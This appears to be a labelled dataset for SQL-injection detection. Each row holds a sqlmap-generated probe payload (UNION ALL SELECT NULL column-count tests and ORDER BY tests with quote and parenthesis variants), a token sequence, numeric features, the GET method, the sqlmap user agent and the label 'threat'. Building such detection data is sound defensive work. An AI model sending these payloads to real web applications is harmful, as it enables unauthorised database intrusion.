"robby') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bCjt",STR SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.15384615384615385 0.19230769230769232 0.23076923076923078 0.2692307692307693 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.2692307692307693 0.23076923076923078 0.19230769230769232 0.15384615384615385,127,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) ORDER BY 1-- DsnD,STR SQUT RPRN RPRN ORDER BY INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) UNION ALL SELECT NULL-- jTCW,STR SQUT RPRN RPRN UNION ALL SELECT NULL DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,67,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby')) UNION ALL SELECT NULL,NULL,NULL-- BMue",STR SQUT RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL DSCMT STR,0.3076923076923077 0.38461538461538464 0.46153846153846156 0.5384615384615385 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.5384615384615385 0.46153846153846156 0.38461538461538464 0.3076923076923077,81,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby')) UNION ALL SELECT NULL,NULL,NULL,NULL-- IyWp",STR SQUT RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,88,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- iATJ",STR SQUT RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,102,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VGTR",STR SQUT RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,116,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Mtzp",STR SQUT RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.16 0.2 0.24 0.28 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.28 0.24 0.2 0.16,123,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' ORDER BY 1-- GrmD,STR SQUT ORDER BY INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' UNION ALL SELECT NULL-- oHKG,STR SQUT UNION ALL SELECT NULL DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,61,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- NtiI",STR SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.23529411764705882 0.29411764705882354 0.3529411764705882 0.4117647058823529 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.4117647058823529 0.3529411764705882 0.29411764705882354 0.23529411764705882,96,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QcIj",STR SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,117,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") ORDER BY 1-- bbLe",STR DQUT RPRN ORDER BY INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") ORDER BY 11-- CFCe",STR DQUT RPRN ORDER BY INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,52,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL-- kQZt",STR DQUT RPRN UNION ALL SELECT NULL DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,64,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL-- xCTL",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL DSCMT STR,0.4 0.5 0.6000000000000001 0.7000000000000001 0.8 0.8 0.8 0.7000000000000001 0.6000000000000001 0.5 0.4,71,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL,NULL,NULL-- POko",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,85,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- eYXn",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,92,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Cgqv",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,106,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- weCK",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,120,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) ORDER BY 1-- dRdD",STR DQUT RPRN RPRN ORDER BY INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) UNION ALL SELECT NULL-- XsqQ",STR DQUT RPRN RPRN UNION ALL SELECT NULL DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,67,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) UNION ALL SELECT NULL,NULL,NULL-- ROip",STR DQUT RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL DSCMT STR,0.3076923076923077 0.38461538461538464 0.46153846153846156 0.5384615384615385 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.5384615384615385 0.46153846153846156 0.38461538461538464 0.3076923076923077,81,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) UNION ALL SELECT NULL,NULL,NULL,NULL-- igRz",STR DQUT RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,88,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zSbE",STR DQUT RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,116,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- aKUN",STR DQUT RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.16 0.2 0.24 0.28 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.28 0.24 0.2 0.16,123,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nrhj",STR DQUT RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,130,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" ORDER BY 1-- wvxO",STR DQUT ORDER BY INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" ORDER BY 11-- MJGW",STR DQUT ORDER BY INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,49,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL-- YSps",STR DQUT UNION ALL SELECT NULL DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,61,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL,NULL-- XjAh",STR DQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL DSCMT STR,0.36363636363636365 0.4545454545454546 0.5454545454545454 0.6363636363636364 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.6363636363636364 0.5454545454545454 0.4545454545454546 0.36363636363636365,75,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL,NULL,NULL-- vnKT",STR DQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.3076923076923077 0.38461538461538464 0.46153846153846156 0.5384615384615385 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.5384615384615385 0.46153846153846156 0.38461538461538464 0.3076923076923077,82,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- iTmb",STR DQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,89,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RgbU",STR DQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,103,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RAze",STR DQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.19047619047619047 0.23809523809523808 0.2857142857142857 0.3333333333333333 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.3333333333333333 0.2857142857142857 0.23809523809523808 0.19047619047619047,110,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- oGVW",STR DQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,117,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") ORDER BY 1-- mOvj",STR DQUT RPRN ORDER BY INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") ORDER BY 11-- GrAd",STR DQUT RPRN ORDER BY INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,52,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL-- SMED",STR DQUT RPRN UNION ALL SELECT NULL DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,64,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL-- AtYw",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL DSCMT STR,0.4 0.5 0.6000000000000001 0.7000000000000001 0.8 0.8 0.8 0.7000000000000001 0.6000000000000001 0.5 0.4,71,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL,NULL-- NGtK",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL DSCMT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,78,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- hOzm",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,92,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- VkaN",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.2222222222222222 0.2777777777777778 0.3333333333333333 0.38888888888888884 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.38888888888888884 0.3333333333333333 0.2777777777777778 0.2222222222222222,99,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mSPa",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,113,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FIaD",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,120,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- oOYi",STR DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.15384615384615385 0.19230769230769232 0.23076923076923078 0.2692307692307693 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.2692307692307693 0.23076923076923078 0.19230769230769232 0.15384615384615385,127,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" ORDER BY 1-- lrDH",STR DQUT ORDER BY INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL-- JiTd",STR DQUT UNION ALL SELECT NULL DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,61,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL-- CTuj",STR DQUT UNION ALL SELECT NULL CMMA NULL DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,68,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL,NULL-- ovhO",STR DQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL DSCMT STR,0.36363636363636365 0.4545454545454546 0.5454545454545454 0.6363636363636364 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.6363636363636364 0.5454545454545454 0.4545454545454546 0.36363636363636365,75,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- mRqk",STR DQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,89,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YHwQ",STR DQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,103,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- XMaw",STR DQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.19047619047619047 0.23809523809523808 0.2857142857142857 0.3333333333333333 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.3333333333333333 0.2857142857142857 0.23809523809523808 0.19047619047619047,110,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GwDP",STR DQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.16 0.2 0.24 0.28 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.28 0.24 0.2 0.16,124,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') ORDER BY 1-- LvBL,STR PRCNT SQUT RPRN ORDER BY INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') ORDER BY 11-- aSKe,STR PRCNT SQUT RPRN ORDER BY INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,55,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') UNION ALL SELECT NULL-- lXLV,STR PRCNT SQUT RPRN UNION ALL SELECT NULL DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,67,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
